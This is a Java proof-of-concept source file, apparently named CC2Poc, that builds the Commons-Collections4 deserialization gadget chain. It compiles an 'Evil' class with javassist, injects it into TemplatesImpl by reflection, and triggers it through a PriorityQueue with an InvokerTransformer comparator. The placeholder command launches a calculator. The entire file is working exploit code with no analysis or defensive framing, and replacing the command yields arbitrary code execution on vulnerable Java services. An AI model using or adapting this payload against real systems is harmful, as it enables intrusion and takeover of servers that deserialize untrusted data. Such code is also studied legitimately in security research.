package com.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.Transformer;
import java.io.*;
import java.util.PriorityQueue;
import java.lang.reflect.Field;

public class CC2Poc {
    public static void main(String[] args) throws Exception {
        ClassPool pool=ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc=pool.makeClass("Evil");
        String cmd="java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String rename="Evil"+System.nanoTime();
        cc.setName(rename);
        byte[] bytes=cc.toBytecode();
        byte[][] target=new byte[][]{bytes};

        TemplatesImpl templates=new TemplatesImpl();
        Field bytecodes=templates.getClass().getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates,target);

        Field name=templates.getClass().getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"Poc");

        Field tfactory=templates.getClass().getDeclaredField("_tfactory");
        tfactory.setAccessible(true);

        InvokerTransformer it=new InvokerTransformer("newTransformer",new Class[0],new Object[0]);

        TransformingComparator tc =new TransformingComparator<>(it);

        PriorityQueue pq=new PriorityQueue<>(new TransformingComparator<>(new ConstantTransformer(1)));
        pq.add(templates);
        pq.add(templates);

        Field f=pq.getClass().getDeclaredField("comparator");
        f.setAccessible(true);
        f.set(pq,tc);


        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(pq);
        oos.close();
        System.out.println("Serialized payload length: " + baos.size());

        ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();  
        ois.close();

        System.out.println("Done");
    }
}